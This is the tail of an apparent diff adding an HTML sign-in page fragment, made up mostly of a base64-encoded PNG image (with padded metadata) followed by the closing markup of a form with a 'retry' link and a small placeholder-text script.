CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pou5U5EAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADqYAAAOpgAABdvkl/FRgAAA7VJREFUeNqslctrG0ccx787O7vKWpalSpa1sgJ2YmktS3LrkoNpoDYJ9NASKJSkGHLopYUceukp+RMcKKTHlp58MBgaCoXQHgopSSEPaMCJJVmSo9ihlrSStUbya519zPaQbOoqRnagXxiYncdnfzPze3Df3pvGYcpW0mdCvdr3Aak9TnlTEHiLAIBpU2bZgtnS/UvaTuhKJpZ7dNh+rhP8ZD0zKPvrfwz4NhQcQ43tcEltR869ezJbPThOD37kamPnx6LF3wXeJACgG9ILbTd4VzekP/dM6QYA9Aj6N5Kofxjybk5Jou4Z8G0o7/S0/s7Vxj5KR5dvv2Fxvpb8OCmXfiUcg2lTVmnFFoZDzy93s3ZNG5qPBSozAm8R5hAUVOWTVLTwGwAQAHi8Ph5MDJRvEY5BNyVjpZE4exQUAIZDzy+vNBJndVMyCMeQGCjferw+HnwNjvrV+wJvEtOmrNw4PZmKLj/EMZWKLj8sN05PmjZlAm+SqF+9DwAkW02lwr6mAgCVVmwhE8st4i2VieUWK63YAgCEfU0lW02lSEBqf8fBgW5KRrfjF9TRiw44B4BjMWpnq6nxzmvRTcng4CDk3ZwjIe/mFAC09vxPulmVlIs3V+oj1xxwoMQiSbm02AnXdoJ3ACAgtceJSA0RALb0vh+OOrISeXq9qCqXLEaZCy/V41fd+a193w0AOCHsewhPbA4ATEY7H8w5rCXl4k+UvIxCSiySiJRn3Q2mLfwFABznvPSK/0uU2AG3T2zGOwAgEGuyM9wPa6V6/JrFKAMAi1FWVJVL/4KtaQCwGe8QwxINAOiTtr88yqJSPX41ESnPUmIRi1FWUJWJpFy86c57PbufA4BhiQbRdoP3ACDQ03q/G7Sgjl5MRMqzHBy40MxgfungmlDv5jQAtHT/Emnp/q8BQBJ0cU0bmu/mbhwcDgBHicV3Qte0oXlJ0EUA0HaDX5DMYD7f2A6XACAWqM5kK+mJt320bCU9EQtUZ9w0mhnM5wkA1NryB26sj4SfPchWUsnjQ1PJkfCzB26uUduRc6+T0HsnlzZXGvELjsNBEnXPqFzKrWrDc0dBV7XhuVG5lJNE3eM4HFYa8Qtuwv9PBSmoyqcj4dWfDyb65m7otm6cuKNEnl53PUMS96f7vdp5SdQ9rwKDlTdOfZaUS790LU1Rv3o37GuOHOcqNrb7y7W2PNW1NAHAqwXxbCV9pr+3+aO/Zyst8CZ1w9hilJm2YLX3+nLNnf6vMrHco7Cv+cYP/xkA+nWvZfmZSuAAAAAASUVORK5CYII="
+                        alt=""><span class="signinTxt" tabIndex="0">retry</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</form>
+<script>
+    if (showPlaceholderText) {
+        setPlaceholderText();
+    }
+</script>
+</body>
+
+</html>
